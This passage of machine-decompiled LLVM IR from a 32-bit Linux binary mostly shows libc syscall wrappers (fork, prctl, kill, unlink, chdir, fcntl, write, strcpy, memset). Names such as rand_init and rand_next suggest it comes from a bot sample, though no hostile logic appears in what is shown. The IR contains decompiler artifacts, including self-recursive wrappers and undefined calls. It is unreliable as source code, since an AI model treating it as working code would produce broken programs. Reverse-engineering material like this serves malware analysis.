  uselistorder i32 (i32)* @__libc_fork, { 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 ()* @rand_next, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_init, { 2, 1, 0 }
  uselistorder i8** %argv, { 1, 0 }
  uselistorder label %dec_label_pc_804981a, { 1, 0 }
  uselistorder label %dec_label_pc_80497d0, { 1, 0 }
  uselistorder label %dec_label_pc_8049759, { 1, 0 }
  uselistorder label %dec_label_pc_8049704, { 1, 0 }
  uselistorder label %dec_label_pc_80496f3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80496ea, { 1, 0 }
  uselistorder label %dec_label_pc_804969e, { 1, 0 }
  uselistorder label %dec_label_pc_8049651, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049648, { 1, 0 }
  uselistorder label %dec_label_pc_80495a4, { 1, 0 }
  uselistorder label %dec_label_pc_8049536, { 1, 0 }
  uselistorder label %dec_label_pc_8049514, { 1, 0 }
  uselistorder label %dec_label_pc_804945b, { 1, 0 }
  uselistorder label %dec_label_pc_8049433, { 1, 0 }
  uselistorder label %dec_label_pc_8049400, { 1, 0 }
  uselistorder label %dec_label_pc_80493d8, { 1, 0 }
  uselistorder label %dec_label_pc_80493b9, { 2, 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v0_8049871 = call i32 @getppid()
  ret i32 %v0_8049871

; uselistorder directives
  uselistorder i32 ()* @getppid, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049874 = load i32, i32* @ebx, align 4
  store i32 %v0_8049874, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8049880 = call i32 @unlink(i32 %v0_8049874)
  store i32 %v1_8049880, i32* %ebx.global-to-local, align 4
  %tmp4 = icmp ult i32 %v1_8049880, -4095
  br i1 %tmp4, label %dec_label_pc_804989a, label %dec_label_pc_804988e

dec_label_pc_804988e:                             ; preds = %entry
  %v0_804988e = load i32, i32* %stack_var_-4, align 4
  %v1_804988e = call i32 @__GI___errno_location(i32 %v0_804988e)
  %v0_8049893 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049893 = sub i32 0, %v0_8049893
  store i32 %v1_8049893, i32* %ebx.global-to-local, align 4
  %v2_8049895 = inttoptr i32 %v1_804988e to i32*
  store i32 %v1_8049893, i32* %v2_8049895, align 4
  br label %dec_label_pc_804989a

dec_label_pc_804989a:                             ; preds = %entry, %dec_label_pc_804988e
  %v0_804989b = phi i32 [ %v1_8049880, %entry ], [ -1, %dec_label_pc_804988e ]
  %v2_804989a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804989a, i32* @ebx, align 4
  ret i32 %v0_804989b

; uselistorder directives
  uselistorder i32 %v1_8049880, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @unlink, { 1, 0 }
  uselistorder label %dec_label_pc_804989a, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v0_80498a1 = call i32 @getpid()
  ret i32 %v0_80498a1
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %v0_80498a8 = load i32, i32* @ebx, align 4
  %v2_80498af = call i32 @time(i32* %arg1)
  store i32 %v0_80498a8, i32* @ebx, align 4
  ret i32 %v2_80498af
}

define i32 @prctl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80498b4 = load i32, i32* @edi, align 4
  %v0_80498b5 = load i32, i32* @esi, align 4
  store i32 %v0_80498b5, i32* %stack_var_-8, align 4
  %v0_80498ca = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80498d2 = call i32 @prctl(i32 %v0_80498ca, i32 %v0_80498b5)
  store i32 %v0_80498ca, i32* @ebx, align 4
  store i32 %v3_80498d2, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_80498d2, -4095
  br i1 %tmp10, label %dec_label_pc_80498eb, label %dec_label_pc_80498df

dec_label_pc_80498df:                             ; preds = %entry
  %v1_80498df = call i32 @__GI___errno_location(i32 %v0_80498ca)
  %v0_80498e4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80498e4 = sub i32 0, %v0_80498e4
  store i32 %v1_80498e4, i32* %esi.global-to-local, align 4
  %v2_80498e6 = inttoptr i32 %v1_80498df to i32*
  store i32 %v1_80498e4, i32* %v2_80498e6, align 4
  br label %dec_label_pc_80498eb

dec_label_pc_80498eb:                             ; preds = %entry, %dec_label_pc_80498df
  %v0_80498ed = phi i32 [ %v3_80498d2, %entry ], [ -1, %dec_label_pc_80498df ]
  %v2_80498eb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80498eb, i32* @esi, align 4
  store i32 %v0_80498b4, i32* @edi, align 4
  ret i32 %v0_80498ed

; uselistorder directives
  uselistorder i32 %v3_80498d2, { 1, 0, 2 }
  uselistorder i32 %v0_80498ca, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_80498eb, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80498f0 = load i32, i32* @ebx, align 4
  store i32 %v0_80498f0, i32* %stack_var_-4, align 4
  %v1_80498f6 = call i32 @fork(i32 %v0_80498f0)
  store i32 %v1_80498f6, i32* %ebx.global-to-local, align 4
  %tmp3 = icmp ult i32 %v1_80498f6, -4095
  br i1 %tmp3, label %dec_label_pc_804990e, label %dec_label_pc_8049902

dec_label_pc_8049902:                             ; preds = %entry
  %v0_8049902 = load i32, i32* %stack_var_-4, align 4
  %v1_8049902 = call i32 @__GI___errno_location(i32 %v0_8049902)
  %v0_8049907 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049907 = sub i32 0, %v0_8049907
  store i32 %v1_8049907, i32* %ebx.global-to-local, align 4
  %v2_8049909 = inttoptr i32 %v1_8049902 to i32*
  store i32 %v1_8049907, i32* %v2_8049909, align 4
  br label %dec_label_pc_804990e

dec_label_pc_804990e:                             ; preds = %entry, %dec_label_pc_8049902
  %v0_804990f = phi i32 [ %v1_80498f6, %entry ], [ -1, %dec_label_pc_8049902 ]
  %v2_804990e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804990e, i32* @ebx, align 4
  ret i32 %v0_804990f

; uselistorder directives
  uselistorder i32 %v1_80498f6, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804990e, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804991e = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804991e
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049929 = load i32, i32* @esi, align 4
  store i32 %v0_8049929, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804993e = load i32, i32* @ebx, align 4
  %v1_8049946 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804993e, i32* @ebx, align 4
  store i32 %v1_8049946, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v1_8049946, -4095
  br i1 %tmp10, label %dec_label_pc_804995f, label %dec_label_pc_8049953

dec_label_pc_8049953:                             ; preds = %entry
  %v1_8049953 = call i32 @__GI___errno_location(i32 %v0_804993e)
  %v0_8049958 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049958 = sub i32 0, %v0_8049958
  store i32 %v1_8049958, i32* %esi.global-to-local, align 4
  %v2_804995a = inttoptr i32 %v1_8049953 to i32*
  store i32 %v1_8049958, i32* %v2_804995a, align 4
  br label %dec_label_pc_804995f

dec_label_pc_804995f:                             ; preds = %entry, %dec_label_pc_8049953
  %v0_8049961 = phi i32 [ %v1_8049946, %entry ], [ -1, %dec_label_pc_8049953 ]
  %v2_804995f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804995f, i32* @esi, align 4
  ret i32 %v0_8049961

; uselistorder directives
  uselistorder i32 %v1_8049946, { 1, 0, 2 }
  uselistorder i32 %v0_804993e, { 1, 0 }
  uselistorder label %dec_label_pc_804995f, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049964 = load i32, i32* @ebx, align 4
  store i32 %v0_8049964, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8049970 = call i32 @chdir(i32 %v0_8049964)
  store i32 %v1_8049970, i32* %ebx.global-to-local, align 4
  %tmp4 = icmp ult i32 %v1_8049970, -4095
  br i1 %tmp4, label %dec_label_pc_804998a, label %dec_label_pc_804997e

dec_label_pc_804997e:                             ; preds = %entry
  %v0_804997e = load i32, i32* %stack_var_-4, align 4
  %v1_804997e = call i32 @__GI___errno_location(i32 %v0_804997e)
  %v0_8049983 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049983 = sub i32 0, %v0_8049983
  store i32 %v1_8049983, i32* %ebx.global-to-local, align 4
  %v2_8049985 = inttoptr i32 %v1_804997e to i32*
  store i32 %v1_8049983, i32* %v2_8049985, align 4
  br label %dec_label_pc_804998a

dec_label_pc_804998a:                             ; preds = %entry, %dec_label_pc_804997e
  %v0_804998b = phi i32 [ %v1_8049970, %entry ], [ -1, %dec_label_pc_804997e ]
  %v2_804998a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804998a, i32* @ebx, align 4
  ret i32 %v0_804998b

; uselistorder directives
  uselistorder i32 %v1_8049970, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_804998a, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804998c = load i32, i32* @ebx, align 4
  store i32 %v0_804998c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804999c = call i32 @kill(i32 %v0_804998c, i32 %tmp3)
  store i32 %v2_804999c, i32* %ebx.global-to-local, align 4
  %tmp5 = icmp ult i32 %v2_804999c, -4095
  br i1 %tmp5, label %dec_label_pc_80499b6, label %dec_label_pc_80499aa

dec_label_pc_80499aa:                             ; preds = %entry
  %v0_80499aa = load i32, i32* %stack_var_-4, align 4
  %v1_80499aa = call i32 @__GI___errno_location(i32 %v0_80499aa)
  %v0_80499af = load i32, i32* %ebx.global-to-local, align 4
  %v1_80499af = sub i32 0, %v0_80499af
  store i32 %v1_80499af, i32* %ebx.global-to-local, align 4
  %v2_80499b1 = inttoptr i32 %v1_80499aa to i32*
  store i32 %v1_80499af, i32* %v2_80499b1, align 4
  br label %dec_label_pc_80499b6

dec_label_pc_80499b6:                             ; preds = %entry, %dec_label_pc_80499aa
  %v0_80499b7 = phi i32 [ %v2_804999c, %entry ], [ -1, %dec_label_pc_80499aa ]
  %v2_80499b6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80499b6, i32* @ebx, align 4
  ret i32 %v0_80499b7

; uselistorder directives
  uselistorder i32 %v2_804999c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80499b6, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80499b8 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_80499cb = add i32 %arg2, -12
  %v6_80499d1 = icmp ugt i32 %v1_80499cb, 2
  store i32 %v0_80499b8, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  br i1 %v6_80499d1, label %dec_label_pc_80499e4, label %dec_label_pc_80499d3

dec_label_pc_80499d3:                             ; preds = %entry
  %v1_80499df = call i32 @int80_syscall(i32 221)
  br label %dec_label_pc_80499f3

dec_label_pc_80499e4:                             ; preds = %entry
  %v2_80499f0 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  br label %dec_label_pc_80499f3

dec_label_pc_80499f3:                             ; preds = %dec_label_pc_80499d3, %dec_label_pc_80499e4
  %storemerge2 = phi i32 [ %v1_80499df, %dec_label_pc_80499d3 ], [ %v2_80499f0, %dec_label_pc_80499e4 ]
  %storemerge1 = load i32, i32* %stack_var_-12, align 4
  store i32 %storemerge2, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %storemerge2, -4095
  br i1 %tmp11, label %dec_label_pc_8049a09, label %dec_label_pc_80499fd

dec_label_pc_80499fd:                             ; preds = %dec_label_pc_80499f3
  %v1_80499fd = call i32 @__GI___errno_location(i32 %storemerge1)
  %v0_8049a02 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049a02 = sub i32 0, %v0_8049a02
  store i32 %v1_8049a02, i32* %ebx.global-to-local, align 4
  %v2_8049a04 = inttoptr i32 %v1_80499fd to i32*
  store i32 %v1_8049a02, i32* %v2_8049a04, align 4
  br label %dec_label_pc_8049a09

dec_label_pc_8049a09:                             ; preds = %dec_label_pc_80499f3, %dec_label_pc_80499fd
  %v0_8049a0b = phi i32 [ %storemerge2, %dec_label_pc_80499f3 ], [ -1, %dec_label_pc_80499fd ]
  store i32 %v0_80499b8, i32* @ebx, align 4
  ret i32 %v0_8049a0b

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049a09, { 1, 0 }
  uselistorder label %dec_label_pc_80499f3, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8049a0c = load i32, i32* @ebx, align 4
  %v1_8049a1f = add i32 %arg2, -12
  %v6_8049a25 = icmp ugt i32 %v1_8049a1f, 2
  store i32 %v0_8049a0c, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  br i1 %v6_8049a25, label %dec_label_pc_8049a38, label %dec_label_pc_8049a27

dec_label_pc_8049a27:                             ; preds = %entry
  %v1_8049a33 = call i32 @int80_syscall(i32 221)
  br label %dec_label_pc_8049a47

dec_label_pc_8049a38:                             ; preds = %entry
  %v2_8049a44 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  br label %dec_label_pc_8049a47

dec_label_pc_8049a47:                             ; preds = %dec_label_pc_8049a27, %dec_label_pc_8049a38
  %storemerge2 = phi i32 [ %v1_8049a33, %dec_label_pc_8049a27 ], [ %v2_8049a44, %dec_label_pc_8049a38 ]
  %storemerge1 = load i32, i32* %stack_var_-12, align 4
  store i32 %storemerge2, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %storemerge2, -4095
  br i1 %tmp11, label %dec_label_pc_8049a5d, label %dec_label_pc_8049a51

dec_label_pc_8049a51:                             ; preds = %dec_label_pc_8049a47
  %v1_8049a51 = call i32 @__GI___errno_location(i32 %storemerge1)
  %v0_8049a56 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049a56 = sub i32 0, %v0_8049a56
  store i32 %v1_8049a56, i32* %ebx.global-to-local, align 4
  %v2_8049a58 = inttoptr i32 %v1_8049a51 to i32*
  store i32 %v1_8049a56, i32* %v2_8049a58, align 4
  br label %dec_label_pc_8049a5d

dec_label_pc_8049a5d:                             ; preds = %dec_label_pc_8049a47, %dec_label_pc_8049a51
  %v0_8049a5f = phi i32 [ %storemerge2, %dec_label_pc_8049a47 ], [ -1, %dec_label_pc_8049a51 ]
  store i32 %v0_8049a0c, i32* @ebx, align 4
  ret i32 %v0_8049a5f

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049a5d, { 1, 0 }
  uselistorder label %dec_label_pc_8049a47, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8049a60 = load i32, i32* @ebx, align 4
  store i32 %v0_8049a60, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* @ecx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8049a75 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8049a75, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_8049a75, -4095
  br i1 %tmp8, label %dec_label_pc_8049a8e, label %dec_label_pc_8049a82

dec_label_pc_8049a82:                             ; preds = %entry
  %v1_8049a82 = call i32 @__GI___errno_location(i32 %v0_8049a60)
  %v0_8049a87 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049a87 = sub i32 0, %v0_8049a87
  store i32 %v1_8049a87, i32* %ebx.global-to-local, align 4
  %v2_8049a89 = inttoptr i32 %v1_8049a82 to i32*
  store i32 %v1_8049a87, i32* %v2_8049a89, align 4
  br label %dec_label_pc_8049a8e

dec_label_pc_8049a8e:                             ; preds = %entry, %dec_label_pc_8049a82
  %v0_8049a8f = phi i32 [ %v4_8049a75, %entry ], [ -1, %dec_label_pc_8049a82 ]
  %v2_8049a8e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049a8e, i32* @ebx, align 4
  ret i32 %v0_8049a8f

; uselistorder directives
  uselistorder i32 %v4_8049a75, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049a8e, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  %v0_8049a90 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v0_8049a90, i32* @ecx, align 4
  call void @exit(i32 %arg1)
  unreachable

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049ab4 = load i32, i32* @ebx, align 4
  store i32 %v0_8049ab4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8049ac0 = call i32 @close(i32 %arg1)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v1_8049ac0, i32* %ebx.global-to-local, align 4
  %tmp4 = icmp ult i32 %v1_8049ac0, -4095
  br i1 %tmp4, label %dec_label_pc_8049ada, label %dec_label_pc_8049ace

dec_label_pc_8049ace:                             ; preds = %entry
  %v0_8049ace = load i32, i32* %stack_var_-4, align 4
  %v1_8049ace = call i32 @__GI___errno_location(i32 %v0_8049ace)
  %v0_8049ad3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049ad3 = sub i32 0, %v0_8049ad3
  store i32 %v1_8049ad3, i32* %ebx.global-to-local, align 4
  %v2_8049ad5 = inttoptr i32 %v1_8049ace to i32*
  store i32 %v1_8049ad3, i32* %v2_8049ad5, align 4
  br label %dec_label_pc_8049ada

dec_label_pc_8049ada:                             ; preds = %entry, %dec_label_pc_8049ace
  %v0_8049adb = phi i32 [ %v1_8049ac0, %entry ], [ -1, %dec_label_pc_8049ace ]
  %v2_8049ada = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049ada, i32* @ebx, align 4
  ret i32 %v0_8049adb

; uselistorder directives
  uselistorder i32 %v1_8049ac0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049ada, { 1, 0 }
}

define i32 @__GI_toupper() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp, i32* @edx, align 4
  %v1_8049ae0 = add i32 %tmp, 128
  %v6_8049aeb = icmp ugt i32 %v1_8049ae0, 383
  br i1 %v6_8049aeb, label %dec_label_pc_8049af6, label %dec_label_pc_8049aed

dec_label_pc_8049aed:                             ; preds = %entry
  %v0_8049aed = load i32, i32* bitcast (i32** @global_var_8053340.27 to i32*), align 64
  %v2_8049af2 = mul i32 %tmp, 2
  %v3_8049af2 = add i32 %v0_8049aed, %v2_8049af2
  %v4_8049af2 = inttoptr i32 %v3_8049af2 to i16*
  %v5_8049af2 = load i16, i16* %v4_8049af2, align 2
  %v6_8049af2 = sext i16 %v5_8049af2 to i32
  store i32 %v6_8049af2, i32* @edx, align 4
  br label %dec_label_pc_8049af6

dec_label_pc_8049af6:                             ; preds = %entry, %dec_label_pc_8049aed
  %v0_8049af6 = phi i32 [ %tmp, %entry ], [ %v6_8049af2, %dec_label_pc_8049aed ]
  ret i32 %v0_8049af6

; uselistorder directives
  uselistorder label %dec_label_pc_8049af6, { 1, 0 }
}

define i32 @__GI___errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80537c0.28 to i32)
}

define i32 @clock() local_unnamed_addr {
entry:
  %tmp = call i64 @__decompiler_undefined_function_3()
  %stack_var_-16 = alloca i32, align 4
  %v12_8049b04 = ptrtoint i32* %stack_var_-16 to i32
  %v1_8049b0a = call i32 @times(i32 %v12_8049b04)
  %v3_8049b0f = load i32, i32* %stack_var_-16, align 4
  %v5_8049b13 = trunc i64 %tmp to i32
  %v6_8049b13 = add i32 %v3_8049b0f, %v5_8049b13
  %v3_8049b17 = mul i32 %v6_8049b13, 10000
  %v1_8049b1d = and i32 %v3_8049b17, 2147483632
  ret i32 %v1_8049b1d
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8049b3e = ptrtoint i8* %arg1 to i32
  %v4_8049b46.pre = load i32, i32* @eax, align 4
  %v8_8049b46.pre = load i1, i1* @df, align 1
  %v9_8049b46 = select i1 %v8_8049b46.pre, i32 -1, i32 1
  br label %dec_label_pc_8049b46

dec_label_pc_8049b46:                             ; preds = %dec_label_pc_8049b4a, %entry
  %v20_8049b47 = phi i32 [ %v23_8049b47, %dec_label_pc_8049b4a ], [ %arg2, %entry ]
  %v4_8049b46 = phi i32 [ %v6_8049b46, %dec_label_pc_8049b4a ], [ %v4_8049b46.pre, %entry ]
  %v7_8049b46 = phi i32 [ %v10_8049b46, %dec_label_pc_8049b4a ], [ %v4_8049b3e, %entry ]
  %v1_8049b46 = inttoptr i32 %v7_8049b46 to i8*
  %v2_8049b46 = load i8, i8* %v1_8049b46, align 1
  %v3_8049b47 = inttoptr i32 %v20_8049b47 to i8*
  %v4_8049b47 = load i8, i8* %v3_8049b47, align 1
  %v15_8049b47 = icmp eq i8 %v2_8049b46, %v4_8049b47
  %v1_8049b48 = icmp eq i1 %v15_8049b47, false
  br i1 %v1_8049b48, label %dec_label_pc_8049b52, label %dec_label_pc_8049b4a

dec_label_pc_8049b4a:                             ; preds = %dec_label_pc_8049b46
  %v23_8049b47 = add i32 %v20_8049b47, %v9_8049b46
  %v10_8049b46 = add i32 %v7_8049b46, %v9_8049b46
  %v3_8049b46 = zext i8 %v2_8049b46 to i32
  %v5_8049b46 = and i32 %v4_8049b46, -256
  %v6_8049b46 = or i32 %v3_8049b46, %v5_8049b46
  %v4_8049b4a = icmp eq i8 %v2_8049b46, 0
  %v1_8049b4c = icmp eq i1 %v4_8049b4a, false
  br i1 %v1_8049b4c, label %dec_label_pc_8049b46, label %dec_label_pc_8049b56

dec_label_pc_8049b52:                             ; preds = %dec_label_pc_8049b46
  br label %dec_label_pc_8049b56

dec_label_pc_8049b56:                             ; preds = %dec_label_pc_8049b4a, %dec_label_pc_8049b52
  %storemerge = phi i32 [ 1, %dec_label_pc_8049b52 ], [ 0, %dec_label_pc_8049b4a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8049b46, { 1, 2, 0 }
  uselistorder i32 %v9_8049b46, { 1, 0 }
  uselistorder label %dec_label_pc_8049b56, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049b5d = load i32, i32* @esi, align 4
  store i32 %v0_8049b5d, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8049b65 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8049b65, i32* %edi.global-to-local, align 4
  %v4_8049b69.pre = load i32, i32* @eax, align 4
  %v8_8049b69.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8049b69

dec_label_pc_8049b69:                             ; preds = %dec_label_pc_8049b69.dec_label_pc_8049b69_crit_edge, %entry
  %v2_8049b6a = phi i32 [ %v7_8049b6a, %dec_label_pc_8049b69.dec_label_pc_8049b69_crit_edge ], [ %v4_8049b65, %entry ]
  %v8_8049b69 = phi i1 [ %v5_8049b6a, %dec_label_pc_8049b69.dec_label_pc_8049b69_crit_edge ], [ %v8_8049b69.pre, %entry ]
  %v4_8049b69 = phi i32 [ %v0_8049b6b, %dec_label_pc_8049b69.dec_label_pc_8049b69_crit_edge ], [ %v4_8049b69.pre, %entry ]
  %v7_8049b69 = phi i32 [ %v0_8049b69.pre, %dec_label_pc_8049b69.dec_label_pc_8049b69_crit_edge ], [ %arg2, %entry ]
  %v1_8049b69 = inttoptr i32 %v7_8049b69 to i8*
  %v2_8049b69 = load i8, i8* %v1_8049b69, align 1
  %v3_8049b69 = zext i8 %v2_8049b69 to i32
  %v5_8049b69 = and i32 %v4_8049b69, -256
  %v6_8049b69 = or i32 %v3_8049b69, %v5_8049b69
  store i32 %v6_8049b69, i32* %eax.global-to-local, align 4
  %v9_8049b69 = select i1 %v8_8049b69, i32 -1, i32 1
  %v10_8049b69 = add i32 %v7_8049b69, %v9_8049b69
  store i32 %v10_8049b69, i32* %esi.global-to-local, align 4
  %v3_8049b6a = inttoptr i32 %v2_8049b6a to i8*
  store i8 %v2_8049b69, i8* %v3_8049b6a, align 1
  %v4_8049b6a = load i32, i32* %edi.global-to-local, align 4
  %v5_8049b6a = load i1, i1* @df, align 1
  %v6_8049b6a = select i1 %v5_8049b6a, i32 -1, i32 1
  %v7_8049b6a = add i32 %v6_8049b6a, %v4_8049b6a
  store i32 %v7_8049b6a, i32* %edi.global-to-local, align 4
  %v0_8049b6b = load i32, i32* %eax.global-to-local, align 4
  %v3_8049b6b = trunc i32 %v0_8049b6b to i8
  %v4_8049b6b = icmp eq i8 %v3_8049b6b, 0
  %v1_8049b6d = icmp eq i1 %v4_8049b6b, false
  br i1 %v1_8049b6d, label %dec_label_pc_8049b69.dec_label_pc_8049b69_crit_edge, label %dec_label_pc_8049b6f

dec_label_pc_8049b69.dec_label_pc_8049b69_crit_edge: ; preds = %dec_label_pc_8049b69
  %v0_8049b69.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049b69

dec_label_pc_8049b6f:                             ; preds = %dec_label_pc_8049b69
  store i32 %v4_8049b65, i32* %eax.global-to-local, align 4
  %v2_8049b74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049b74, i32* @esi, align 4
  ret i32 %v4_8049b65

; uselistorder directives
  uselistorder i32 %v0_8049b6b, { 1, 0 }
  uselistorder i32 %v7_8049b6a, { 1, 0 }
  uselistorder i1 %v5_8049b6a, { 1, 0 }
  uselistorder i32 %v4_8049b65, { 1, 2, 0, 3 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b78 = load i32, i32* @edi, align 4
  store i32 %v0_8049b78, i32* %stack_var_-4, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8049b7c = sdiv i32 %sext, 16777216
  store i32 %v4_8049b7c, i32* %eax.global-to-local, align 4
  %v4_8049b84 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8049b84, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_8049b8a = udiv i32 %arg3, 4
  %tmp = icmp ult i32 %arg3, 4
  store i32 %v2_8049b8a, i32* @ecx, align 4
  br i1 %tmp, label %bb, label %dec_label_pc_8049b8f

dec_label_pc_8049b8f:                             ; preds = %entry
  %v1_8049b8f = urem i32 %v4_8049b7c, 256
  %v3_8049b92 = mul nuw i32 %v1_8049b8f, 16843009
